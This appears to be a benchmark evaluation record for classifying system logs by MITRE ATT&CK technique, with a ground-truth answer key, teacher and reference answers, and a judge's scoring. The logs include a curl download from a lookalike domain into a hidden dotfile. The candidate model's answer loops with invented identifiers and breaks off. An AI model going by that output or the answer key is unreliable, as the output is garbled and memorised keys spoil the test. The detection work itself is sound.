@@ -1,0 +1,283 @@
+{
+  "prompt_id": "379",
+  "scenario": "6",
+  "variant": "screensharing_binary",
+  "step": "49",
+  "split": "train",
+  "group_id": "[\"6\", \"49\"]",
+  "prompt_text": "You are a MITRE ATT&CK TTP classification expert. Your task is to classify the following system log data. You are provided with samples from one or more hosts and one or more log sources that are captured during execution of one specific MITRE ATT&CK technique. Always output a valid JSON object with the following fields:\n    - \"techniques\": A list of top 10 ATT&CK techniques that are most likely related to the sample logs, sorted in descending order. Only print the ID of the techniques without any other descriptions.\n    - \"confidence\": An estimate for the certainty that the logs indicate an actual attack rather than normal system or user activity. Provide one of the following estimates: \"Certain: Attack\", \"Almost Certain: Attack\", \"Somewhat Certain: Attack\", \"Neutral\", \"Somewhat Certain: Normal\", \"Almost Certain: Normal\", \"Certain: Normal\"\n    - \"explanation\": A brief explanation (1-2 sentences) why you think that the samples correspond to attacks or normal behavior, e.g., by pointing to specific artifacts or properties of the logs.\n\nclient:\n    logs/log/audit/audit.log:\n        type=SYSCALL msg=audit(1765380733.300:80148): arch=c000003e syscall=59 success=yes exit=0 a0=56025a985ed0 a1=56025a8aa030 a2=56025a9b71c0 a3=8 items=2 ppid=10238 pid=20387 auid=1002 uid=1002 gid=1002 euid=1002 suid=1002 fsuid=1002 egid=1002 sgid=1002 fsgid=1002 tty=pts1 ses=1 comm=\"curl\" exe=\"/usr/bin/curl\" subj=unconfined\u001dARCH=x86_64 SYSCALL=execve AUID=\"judy\" UID=\"judy\" GID=\"judy\" EUID=\"judy\" SUID=\"judy\" FSUID=\"judy\" EGID=\"judy\" SGID=\"judy\" FSGID=\"judy\"\n        type=EXECVE msg=audit(1765380733.300:80148): argc=4 a0=\"curl\" a1=\"-o\" a2=\"/home/judy/.index\" a3=\"facebock.com:8080/index\"\n        type=PATH msg=audit(1765380733.300:80148): item=0 name=\"/usr/bin/curl\" inode=2176 dev=fc:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\"\n        type=PATH msg=audit(1765380733.300:80148): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=82044 dev=fc:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\"\n        type=PROCTITLE msg=audit(1765380733.300:80148): proctitle=6375726C002D6F002F686F6D652F6A7564792F2E696E6465780066616365626F636B2E636F6D3A383038302F696E646578\n        type=SYSCALL msg=audit(1765380733.320:80155): arch=c000003e syscall=42 success=no exit=-115 a0=5 a1=7fff0d76d760 a2=10 a3=7fff0d7a9080 items=0 ppid=10238 pid=20387 auid=1002 uid=1002 gid=1002 euid=1002 suid=1002 fsuid=1002 egid=1002 sgid=1002 fsgid=1002 tty=pts1 ses=1 comm=\"curl\" exe=\"/usr/bin/curl\" subj=unconfined\u001dARCH=x86_64 SYSCALL=connect AUID=\"judy\" UID=\"judy\" GID=\"judy\" EUID=\"judy\" SUID=\"judy\" FSUID=\"judy\" EGID=\"judy\" SGID=\"judy\" FSGID=\"judy\"\n        type=SOCKADDR msg=audit(1765380733.320:80155): saddr=02000C38C0A832FE0000000000000000\u001dSADDR={ saddr_fam=inet laddr=192.168.50.254 lport=3128 }\n        type=PROCTITLE msg=audit(1765380733.320:80155): proctitle=6375726C002D6F002F686F6D652F6A7564792F2E696E6465780066616365626F636B2E636F6D3A383038302F696E646578\ninetfw:\n    logs/log/squid/access.log:\n        2025-12-10T15:32:13.620 +0000 192.168.50.100 TCP_MISS/200 782 GET http://facebock.com:8080/index - HIER_DIRECT/192.42.1.174 text/plain\n    logs/log/suricata/fast.log:\n        12/10/2025-15:32:13.621895  [**] [1:2034635:3] ET INFO Python BaseHTTP ServerBanner [**] [Classification: Misc activity] [Priority: 3] {TCP} 192.168.50.254:3128 -> 192.168.50.100:60912\nwazuh:\n    logs/alerts/alerts.json:\n        {\"timestamp\":\"2025-12-10T15:32:13.698+0000\",\"rule\":{\"level\":3,\"description\":\"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\",\"id\":\"86601\",\"firedtimes\":55,\"mail\":false,\"groups\":[\"ids\",\"suricata\"]},\"agent\":{\"id\":\"001\",\"name\":\"inetfw\",\"ip\":\"192.168.100.254\"},\"manager\":{\"name\":\"wazuh\"},\"id\":\"1765380733.1837279\",\"decoder\":{\"name\":\"json\"},\"data\":{\"timestamp\":\"2025-12-10T15:32:13.621895+0000\",\"flow_id\":\"1540001636354281.000000\",\"in_iface\":\"ens7\",\"event_type\":\"alert\",\"src_ip\":\"192.168.50.254\",\"src_port\":\"3128\",\"dest_ip\":\"192.168.50.100\",\"dest_port\":\"60912\",\"proto\":\"TCP\",\"community_id\":\"1:ots7SM+F3m/FPOBq5Ujo2tyK+zo=\",\"tx_id\":\"0\",\"alert\":{\"action\":\"allowed\",\"gid\":\"1\",\"signature_id\":\"2034635\",\"rev\":\"3\",\"signature\":\"ET INFO Python BaseHTTP ServerBanner\",\"category\":\"Misc activity\",\"severity\":\"3\",\"metadata\":{\"affected_product\":[\"Windows_XP_Vista_7_8_10_Server_32_64_Bit\"],\"attack_target\":[\"Client_Endpoint\"],\"confidence\":[\"High\"],\"created_at\":[\"2021_12_08\"],\"deployment\":[\"Perimeter\"],\"signature_severity\":[\"Informational\"],\"tag\":[\"Description_Generated_By_Proofpoint_Nexus\"],\"updated_at\":[\"2022_11_21\"]}},\"http\":{\"hostname\":\"facebock.com\",\"http_port\":\"8080\",\"url\":\"http://facebock.com:8080/index\",\"http_user_agent\":\"curl/7.81.0\",\"http_content_type\":\"text/plain\",\"http_method\":\"GET\",\"protocol\":\"HTTP/1.1\",\"status\":\"200\",\"length\":\"524\"},\"files\":[{\"filename\":\"/index\",\"sid\":[],\"gaps\":false,\"state\":\"CLOSED\",\"stored\":false,\"size\":524,\"tx_id\":0}],\"app_proto\":\"http\",\"flow\":{\"pkts_toserver\":\"6\",\"pkts_toclient\":\"5\",\"bytes_toserver\":\"544\",\"bytes_toclient\":\"1120\",\"start\":\"2025-12-10T15:32:13.592105+0000\"}},\"location\":\"/var/log/suricata/eve.json\"}",
+  "prompt_sha256": "f940e389b86e218b5289f9d078a6c549a11318104386a733d8ea3e3e721890e8",
+  "ground_truth": "[\"T1105\", \"T1219\", \"T1564.001\"]",
+  "teacher_model": "openai/gpt-5.5-20260423",
+  "teacher_response_raw": "{\"techniques\": [\"T1105\", \"T1583.001\", \"T1071.001\", \"T1204.002\", \"T1566.002\", \"T1036.003\", \"T1189\", \"T1059.004\", \"T1027.010\", \"T1102\"], \"confidence\": \"Somewhat Certain: Attack\", \"explanation\": \"The logs show user judy executing curl to download a file to a hidden path (/home/judy/.index) from a typo-squatted domain facebock.com over HTTP on port 8080, with IDS noting a Python BaseHTTP server banner. This is most consistent with ingress tool/file transfer from attacker-controlled infrastructure, though curl downloads can also be legitimate.\"}",
+  "teacher_response_sha256": "514f7ace61a6bb79b305fdc4850d213d58e54442e49b44229e09fb20e216936d",
+  "teacher_confidence_label": "Somewhat Certain: Attack",
+  "model": "hermes",
+  "condition": "untreated_hf",
+  "candidate_status": "completed",
+  "candidate_record_id": "7f0855a29924a03de1bb1972832b7a2895bd3fefeae9eec293caf36c13f7927b:379",
+  "candidate_response_raw": "{\n    \"techniques\": [\n        {\n            \"id\": \"86601\",\n            \"confidence\": \"High\",\n            \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n        }\n    ],\n    \"confidence\": \"High\",\n    \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n}\n```json\n{\n    \"techniques\": [\n        {\n            \"id\": \"86602\",\n            \"confidence\": \"High\",\n            \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n        }\n    ],\n    \"confidence\": \"High\",\n    \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n}\n```json\n{\n    \"techniques\": [\n        {\n            \"id\": \"86603\",\n            \"confidence\": \"High\",\n            \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n        }\n    ],\n    \"confidence\": \"High\",\n    \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n}\n```json\n{\n    \"techniques\": [\n        {\n            \"id\": \"86604\",\n            \"confidence\": \"High\",\n            \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n        }\n    ],\n    \"confidence\": \"High\",\n    \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n}\n```json\n{\n    \"techniques\": [\n        {\n            \"id\": \"86605\",\n            \"confidence\": \"High\",\n            \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n        }\n    ],\n    \"confidence\": \"High\",\n    \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n}\n```json\n{\n    \"techniques\": [\n        {\n            \"id\": \"86606\",\n            \"confidence\": \"High\",\n            \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n        }\n    ],\n    \"confidence\": \"High\",\n    \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n}\n```json\n{\n    \"techniques\": [\n        {\n            \"id\": \"86607\",\n            \"confidence\": \"High\",\n            \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n        }\n    ],\n    \"confidence\": \"High\",\n    \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n}\n```json\n{\n    \"techniques\": [\n        {\n            \"id\": \"86608\",\n            \"confidence\": \"High\",\n            \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n        }\n    ],\n    \"confidence\": \"High\",\n    \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n}\n```json\n{\n    \"techniques\": [\n        {\n            \"id\": \"86609\",\n            \"confidence\": \"High\",\n            \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n        }\n    ],\n    \"confidence\": \"High\",\n    \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n}\n```json\n{\n    \"techniques\": [\n        {\n            \"id\": \"86610\",\n            \"confidence\": \"High\",\n            \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n        }\n    ],\n    \"confidence\": \"High\",\n    \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n}\n```json\n{\n    \"techniques\": [\n        {\n            \"id\": \"86611\",\n            \"confidence\": \"High\",\n            \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n        }\n    ],\n    \"confidence\": \"High\",\n    \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n}\n```json\n{\n    \"techniques\": [\n        {\n            \"id\": \"86612\",\n            \"confidence\": \"High\",\n            \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n        }\n    ],\n    \"confidence\": \"High\",\n    \"explanation\": \"Suricata: Alert - ET INFO Python BaseHTTP ServerBanner\"\n}\n```json\n{\n    \"techniques\": [\n        {\n            \"id\": \"86613\",\n            \"confidence\": \"High\",\n            \"explanation\": \"Suricata: Alert - ET",
+  "candidate_response_sha256": "72a92c25354b10e44208c1d911f925d548b9716f2c9579019f559f529202060b",
+  "candidate_confidence_label_strict": "",
+  "candidate_experiment_id": "camlds_exact_teacher_v1",
+  "candidate_model": "hermes",
+  "candidate_condition": "untreated_hf",
+  "candidate_attempt_count": 1,
+  "candidate_config_hash": "7f0855a29924a03de1bb1972832b7a2895bd3fefeae9eec293caf36c13f7927b",
+  "candidate_model_revision": "898cd6ff3637a762c9b74309a384cc5db68fdfee",
+  "candidate_adapter_sha256": "",
+  "candidate_precision": "bfloat16",
+  "candidate_generation_settings": {
+    "experiment_id": "camlds_exact_teacher_v1",
+    "seed": 42,
+    "precision": "bfloat16",
+    "max_new_tokens": 1024,
+    "do_sample": false,
+    "repetition_penalty": 1.0,
+    "epochs": 3,
+    "batch_size": 1,
+    "gradient_accumulation": 16,
+    "save_steps": 10,
+    "training_context": 8192,
+    "test_conditions": [
+      "technique",
+      "explanation",
+      "joint",
+      "full"
+    ],
+    "teacher_model": "openai/gpt-5.5-20260423",
+    "teacher_first": 1981,
+    "teacher_last": 2970,
+    "training_policy": "universal-feasible-full-response-exact-distillation",
+    "bitnet_policy": "BF16-master-with-native-online-ternary-weight-int8-activation-forward",
+    "tokenizer_regex_policy": "checkpoint-original-no-mistral-regex-rewrite",
+    "prompt_policy": "source-text-unchanged",
+    "loss": "equal-per-field-per-example",
+    "haiku_model": "claude-haiku-5-5",
+    "haiku_max_tokens": 128000,
+    "judge_max_tokens": 8192,
+    "haiku_temperature": null,
+    "haiku_thinking": {
+      "type": "disabled"
+    }
+  },
+  "candidate_generation_error": "",
+  "candidate_finish_reason": "length",
+  "candidate_input_truncated": false,
+  "candidate_gpu": "NVIDIA A100-SXM4-80GB",
+  "candidate_bitnet_intrinsic_quantization": false,
+  "candidate_input_tokens": 2329,
+  "candidate_max_new_tokens": 1024,
+  "candidate_output_allowance_reduced": false,
+  "candidate_response_truncated": true,
+  "candidate_output_tokens": 1024,
+  "candidate_elapsed_seconds": 24.834310526988702,
+  "candidate_output_tokens_per_second": 41.23327679611509,
+  "candidate_peak_allocated_bytes": 4394840064,
+  "candidate_peak_reserved_bytes": 9992929280,
+  "candidate_response_empty": false,
+  "candidate_valid_json": false,
+  "candidate_schema_adherent": false,
+  "candidate_required_fields_present": false,
+  "candidate_unexpected_text_present": false,
+  "candidate_parse_error": "Whole response is not strict JSON",
+  "haiku_reference_status": "completed",
+  "haiku_reference_record_id": "83bb4b6c8883a1b5a84c41e1de800d4b8c02c002313d126cfe4b12ca9181f5f8",
+  "haiku_reference_response_raw": "```json\n{\n  \"techniques\": [\"T1105\", \"T1071.001\", \"T1571\", \"T1568\", \"T1204.002\", \"T1584.004\", \"T1583.001\", \"T1036\", \"T1027\", \"T1046\"],\n  \"confidence\": \"Almost Certain: Attack\",\n  \"explanation\": \"The user 'judy' invoked curl with an output file in her home directory (/home/judy/.index) to download content from 'facebock.com:8080/index', a typo-squatted domain mimicking facebook.com, with a hidden dotfile name and the download routed through a proxy (192.168.50.254:3128). The response was a Python BaseHTTP server banner flagged by Suricata, indicating an attacker-controlled HTTP server serving the payload, consistent with ingress tool transfer from a lookalike domain.\"\n}\n```",
+  "haiku_reference_response_sha256": "e7736c8a21c77820664d2681de3da967d00195aacde4a34bf75593b89ffe9e0a",
+  "haiku_reference_confidence_label_strict": "",
+  "haiku_reference_finish_reason": "end_turn",
+  "judge_protocol": "uniform_common_v2_confidence_agreement",
+  "record_id": "9e988a205621f3ef6b09dd7f96db7c7b85f2b55f91a80fd9470fb66f452f9f40",
+  "status": "completed",
+  "response_raw": "{\"scores\": {\"technique_identification\": {\"score\": 0, \"reason\": \"The candidate's technique list contains only the Suricata rule ID '86601' and then repeated fabricated IDs (86602-86613). None of the ground-truth IDs (T1105, T1219, T1564.001) appear among the first ten distinct predictions.\"}, \"prediction_evidence_support\": {\"score\": 0, \"reason\": \"Rule IDs 86601-86613 are not ATT&CK technique identifiers and are not supported by the logs; they are the Wazuh rule ID and invented sequential numbers.\"}, \"explanation_grounding\": {\"score\": 1, \"reason\": \"The explanation simply restates the Suricata alert name ('ET INFO Python BaseHTTP ServerBanner'), which is an actual observation, but provides no analysis of the curl download, typo-squatted domain, hidden dotfile, or proxy use.\"}, \"prediction_reason_alignment\": {\"score\": 0, \"reason\": \"Predictions are not ATT&CK techniques and the stated reason is only the alert title; there is no connection between any technique and supporting artifacts.\"}, \"confidence_evidence_support\": {\"score\": 1, \"reason\": \"The candidate's 'High' confidence is not an ATT&CK-style label and is not justified beyond the alert name; it does not map cleanly onto the required seven categories and is weakly supported by the logs.\"}, \"instruction_adherence\": {\"score\": 0, \"reason\": \"The response is not valid JSON: it repeats multiple JSON objects separated by code fences, uses 'High' instead of the required category labels, returns objects rather than a list of technique IDs, and includes fabricated IDs.\"}}, \"null_reasons\": {\"prediction_similarity\": \"Comparison response with ground truth not provided as a usable similarity judgment; the reference Haiku response was not scored.\", \"reasoning_similarity\": \"Comparison response not provided as a usable similarity judgment.\"}, \"extracted_predictions\": [\"86601\", \"86602\", \"86603\", \"86604\", \"86605\", \"86606\", \"86607\", \"86608\", \"86609\", \"86610\"], \"failure_labels\": [\"invalid_json_multiple_objects\", \"non_attack_technique_identifiers\", \"fabricated_identifiers\", \"wrong_confidence_vocabulary\", \"no_ground_truth_technique_coverage\", \"explanation_restates_alert_only\"], \"prediction_similarity\": 0, \"reasoning_similarity\": 1, \"candidate_confidence_label\": \"High\", \"judge_warranted_confidence_label\": \"Almost Certain: Attack\", \"confidence_label_agreement\": 2, \"confidence_label_agreement_reason\": \"'High' is not one of the seven categories; it is a directional Attack-leaning label, but the mapping to 'Almost Certain: Attack' or 'Certain: Attack' is ambiguous, so the agreement is moderate.\", \"confidence_label_null_reason\": null}",
+  "response_hash": "7f749b2a7d5299c67b11cb1d102576b68121fcd06f735c89f4e4d1424f377ad7",
+  "finish_reason": "end_turn",
+  "response_truncated": false,
+  "api_response": {
+    "id": "msg_011CgTv1oU6zgaumUa18Mgdu",
+    "container": null,
+    "content": [
+      {
+        "citations": null,
+        "text": "{\"scores\": {\"technique_identification\": {\"score\": 0, \"reason\": \"The candidate's technique list contains only the Suricata rule ID '86601' and then repeated fabricated IDs (86602-86613). None of the ground-truth IDs (T1105, T1219, T1564.001) appear among the first ten distinct predictions.\"}, \"prediction_evidence_support\": {\"score\": 0, \"reason\": \"Rule IDs 86601-86613 are not ATT&CK technique identifiers and are not supported by the logs; they are the Wazuh rule ID and invented sequential numbers.\"}, \"explanation_grounding\": {\"score\": 1, \"reason\": \"The explanation simply restates the Suricata alert name ('ET INFO Python BaseHTTP ServerBanner'), which is an actual observation, but provides no analysis of the curl download, typo-squatted domain, hidden dotfile, or proxy use.\"}, \"prediction_reason_alignment\": {\"score\": 0, \"reason\": \"Predictions are not ATT&CK techniques and the stated reason is only the alert title; there is no connection between any technique and supporting artifacts.\"}, \"confidence_evidence_support\": {\"score\": 1, \"reason\": \"The candidate's 'High' confidence is not an ATT&CK-style label and is not justified beyond the alert name; it does not map cleanly onto the required seven categories and is weakly supported by the logs.\"}, \"instruction_adherence\": {\"score\": 0, \"reason\": \"The response is not valid JSON: it repeats multiple JSON objects separated by code fences, uses 'High' instead of the required category labels, returns objects rather than a list of technique IDs, and includes fabricated IDs.\"}}, \"null_reasons\": {\"prediction_similarity\": \"Comparison response with ground truth not provided as a usable similarity judgment; the reference Haiku response was not scored.\", \"reasoning_similarity\": \"Comparison response not provided as a usable similarity judgment.\"}, \"extracted_predictions\": [\"86601\", \"86602\", \"86603\", \"86604\", \"86605\", \"86606\", \"86607\", \"86608\", \"86609\", \"86610\"], \"failure_labels\": [\"invalid_json_multiple_objects\", \"non_attack_technique_identifiers\", \"fabricated_identifiers\", \"wrong_confidence_vocabulary\", \"no_ground_truth_technique_coverage\", \"explanation_restates_alert_only\"], \"prediction_similarity\": 0, \"reasoning_similarity\": 1, \"candidate_confidence_label\": \"High\", \"judge_warranted_confidence_label\": \"Almost Certain: Attack\", \"confidence_label_agreement\": 2, \"confidence_label_agreement_reason\": \"'High' is not one of the seven categories; it is a directional Attack-leaning label, but the mapping to 'Almost Certain: Attack' or 'Certain: Attack' is ambiguous, so the agreement is moderate.\", \"confidence_label_null_reason\": null}",
+        "type": "text"
+      }
+    ],
+    "model": "claude-haiku-5-5",
+    "role": "assistant",
+    "stop_details": null,
+    "stop_reason": "end_turn",
+    "stop_sequence": null,
+    "type": "message",
+    "usage": {
+      "cache_creation": {
+        "ephemeral_1h_input_tokens": 0,
+        "ephemeral_5m_input_tokens": 0
+      },
+      "cache_creation_input_tokens": 0,
+      "cache_read_input_tokens": 0,
+      "inference_geo": "global",
+      "input_tokens": 6997,
+      "output_tokens": 974,
+      "output_tokens_details": {
+        "thinking_tokens": 0
+      },
+      "server_tool_use": null,
+      "service_tier": "batch",
+      "speed": "standard"
+    },
+    "diagnostics": null
+  },
+  "usage": {
+    "cache_creation": {
+      "ephemeral_1h_input_tokens": 0,
+      "ephemeral_5m_input_tokens": 0
+    },
+    "cache_creation_input_tokens": 0,
+    "cache_read_input_tokens": 0,
+    "inference_geo": "global",
+    "input_tokens": 6997,
+    "output_tokens": 974,
+    "output_tokens_details": {
+      "thinking_tokens": 0
+    },
+    "server_tool_use": null,
+    "service_tier": "batch",
+    "speed": "standard"
+  },
+  "estimated_cost_usd": 0.00059335,
+  "batch_api": true,
+  "elapsed_seconds": 41469.749032735825,
+  "latency_note": "batch completion delay; inference latency unavailable",
+  "attempt_count": 1,
+  "input_tokens": 6997,
+  "output_tokens": 974,
+  "wire_max_tokens": 8192,
+  "api_request_id": null,
+  "judge_response_raw": "{\"scores\": {\"technique_identification\": {\"score\": 0, \"reason\": \"The candidate's technique list contains only the Suricata rule ID '86601' and then repeated fabricated IDs (86602-86613). None of the ground-truth IDs (T1105, T1219, T1564.001) appear among the first ten distinct predictions.\"}, \"prediction_evidence_support\": {\"score\": 0, \"reason\": \"Rule IDs 86601-86613 are not ATT&CK technique identifiers and are not supported by the logs; they are the Wazuh rule ID and invented sequential numbers.\"}, \"explanation_grounding\": {\"score\": 1, \"reason\": \"The explanation simply restates the Suricata alert name ('ET INFO Python BaseHTTP ServerBanner'), which is an actual observation, but provides no analysis of the curl download, typo-squatted domain, hidden dotfile, or proxy use.\"}, \"prediction_reason_alignment\": {\"score\": 0, \"reason\": \"Predictions are not ATT&CK techniques and the stated reason is only the alert title; there is no connection between any technique and supporting artifacts.\"}, \"confidence_evidence_support\": {\"score\": 1, \"reason\": \"The candidate's 'High' confidence is not an ATT&CK-style label and is not justified beyond the alert name; it does not map cleanly onto the required seven categories and is weakly supported by the logs.\"}, \"instruction_adherence\": {\"score\": 0, \"reason\": \"The response is not valid JSON: it repeats multiple JSON objects separated by code fences, uses 'High' instead of the required category labels, returns objects rather than a list of technique IDs, and includes fabricated IDs.\"}}, \"null_reasons\": {\"prediction_similarity\": \"Comparison response with ground truth not provided as a usable similarity judgment; the reference Haiku response was not scored.\", \"reasoning_similarity\": \"Comparison response not provided as a usable similarity judgment.\"}, \"extracted_predictions\": [\"86601\", \"86602\", \"86603\", \"86604\", \"86605\", \"86606\", \"86607\", \"86608\", \"86609\", \"86610\"], \"failure_labels\": [\"invalid_json_multiple_objects\", \"non_attack_technique_identifiers\", \"fabricated_identifiers\", \"wrong_confidence_vocabulary\", \"no_ground_truth_technique_coverage\", \"explanation_restates_alert_only\"], \"prediction_similarity\": 0, \"reasoning_similarity\": 1, \"candidate_confidence_label\": \"High\", \"judge_warranted_confidence_label\": \"Almost Certain: Attack\", \"confidence_label_agreement\": 2, \"confidence_label_agreement_reason\": \"'High' is not one of the seven categories; it is a directional Attack-leaning label, but the mapping to 'Almost Certain: Attack' or 'Certain: Attack' is ambiguous, so the agreement is moderate.\", \"confidence_label_null_reason\": null}",
+  "judge_response_sha256": "7f749b2a7d5299c67b11cb1d102576b68121fcd06f735c89f4e4d1424f377ad7",
+  "judge_finish_reason": "end_turn",
+  "judge_response_truncated": false,
+  "judge_response_empty": false,
+  "judge_valid_json": true,
+  "judge_schema_adherent": false,
+  "judge_required_fields_present": false,
+  "judge_unexpected_text_present": false,
+  "judge_parse_error": "",
+  "judge_parseable": true,
+  "judge_parsed": {
+    "scores": {
+      "technique_identification": {
+        "score": 0,
+        "reason": "The candidate's technique list contains only the Suricata rule ID '86601' and then repeated fabricated IDs (86602-86613). None of the ground-truth IDs (T1105, T1219, T1564.001) appear among the first ten distinct predictions."
+      },
+      "prediction_evidence_support": {
+        "score": 0,
+        "reason": "Rule IDs 86601-86613 are not ATT&CK technique identifiers and are not supported by the logs; they are the Wazuh rule ID and invented sequential numbers."
+      },
+      "explanation_grounding": {
+        "score": 1,
+        "reason": "The explanation simply restates the Suricata alert name ('ET INFO Python BaseHTTP ServerBanner'), which is an actual observation, but provides no analysis of the curl download, typo-squatted domain, hidden dotfile, or proxy use."
+      },
+      "prediction_reason_alignment": {
+        "score": 0,
+        "reason": "Predictions are not ATT&CK techniques and the stated reason is only the alert title; there is no connection between any technique and supporting artifacts."
+      },
+      "confidence_evidence_support": {
+        "score": 1,
+        "reason": "The candidate's 'High' confidence is not an ATT&CK-style label and is not justified beyond the alert name; it does not map cleanly onto the required seven categories and is weakly supported by the logs."
+      },
+      "instruction_adherence": {
+        "score": 0,
+        "reason": "The response is not valid JSON: it repeats multiple JSON objects separated by code fences, uses 'High' instead of the required category labels, returns objects rather than a list of technique IDs, and includes fabricated IDs."
+      }
+    },
+    "null_reasons": {
+      "prediction_similarity": "Comparison response with ground truth not provided as a usable similarity judgment; the reference Haiku response was not scored.",
+      "reasoning_similarity": "Comparison response not provided as a usable similarity judgment."
+    },
+    "extracted_predictions": [
+      "86601",
+      "86602",
+      "86603",
+      "86604",
+      "86605",
+      "86606",
+      "86607",
+      "86608",
+      "86609",
+      "86610"
+    ],
+    "failure_labels": [
+      "invalid_json_multiple_objects",
+      "non_attack_technique_identifiers",
+      "fabricated_identifiers",
+      "wrong_confidence_vocabulary",
+      "no_ground_truth_technique_coverage",
+      "explanation_restates_alert_only"
+    ],
+    "prediction_similarity": 0,
+    "reasoning_similarity": 1,
+    "candidate_confidence_label": "High",
+    "judge_warranted_confidence_label": "Almost Certain: Attack",
+    "confidence_label_agreement": 2,
+    "confidence_label_agreement_reason": "'High' is not one of the seven categories; it is a directional Attack-leaning label, but the mapping to 'Almost Certain: Attack' or 'Certain: Attack' is ambiguous, so the agreement is moderate.",
+    "confidence_label_null_reason": null
+  },
+  "score_technique_identification": {
+    "score": 0,
+    "reason": "The candidate's technique list contains only the Suricata rule ID '86601' and then repeated fabricated IDs (86602-86613). None of the ground-truth IDs (T1105, T1219, T1564.001) appear among the first ten distinct predictions."
+  },
+  "score_prediction_evidence_support": {
+    "score": 0,
+    "reason": "Rule IDs 86601-86613 are not ATT&CK technique identifiers and are not supported by the logs; they are the Wazuh rule ID and invented sequential numbers."
+  },
+  "score_explanation_grounding": {
+    "score": 1,
+    "reason": "The explanation simply restates the Suricata alert name ('ET INFO Python BaseHTTP ServerBanner'), which is an actual observation, but provides no analysis of the curl download, typo-squatted domain, hidden dotfile, or proxy use."
+  },
+  "score_prediction_reason_alignment": {
+    "score": 0,
+    "reason": "Predictions are not ATT&CK techniques and the stated reason is only the alert title; there is no connection between any technique and supporting artifacts."
+  },
+  "score_confidence_evidence_support": {
+    "score": 1,
+    "reason": "The candidate's 'High' confidence is not an ATT&CK-style label and is not justified beyond the alert name; it does not map cleanly onto the required seven categories and is weakly supported by the logs."
+  },
+  "score_instruction_adherence": {
+    "score": 0,
+    "reason": "The response is not valid JSON: it repeats multiple JSON objects separated by code fences, uses 'High' instead of the required category labels, returns objects rather than a list of technique IDs, and includes fabricated IDs."
+  },
+  "judge_null_reasons": {
+    "prediction_similarity": "Comparison response with ground truth not provided as a usable similarity judgment; the reference Haiku response was not scored.",
+    "reasoning_similarity": "Comparison response not provided as a usable similarity judgment."
+  },
+  "judge_extracted_predictions": [
+    "86601",
+    "86602",
+    "86603",
+    "86604",
+    "86605",
+    "86606",
+    "86607",
+    "86608",
+    "86609",
+    "86610"
+  ],
+  "judge_failure_labels": [
+    "invalid_json_multiple_objects",
+    "non_attack_technique_identifiers",
+    "fabricated_identifiers",
+    "wrong_confidence_vocabulary",
+    "no_ground_truth_technique_coverage",
+    "explanation_restates_alert_only"
+  ],
+  "judge_prediction_similarity": 0,
+  "judge_reasoning_similarity": 1,
+  "candidate_confidence_label": "High",
+  "judge_warranted_confidence_label": "Almost Certain: Attack",
+  "confidence_label_agreement": 2,
+  "confidence_label_agreement_reason": "'High' is not one of the seven categories; it is a directional Attack-leaning label, but the mapping to 'Almost Certain: Attack' or 'Certain: Attack' is ambiguous, so the agreement is moderate.",
+  "confidence_label_null_reason": null
+}
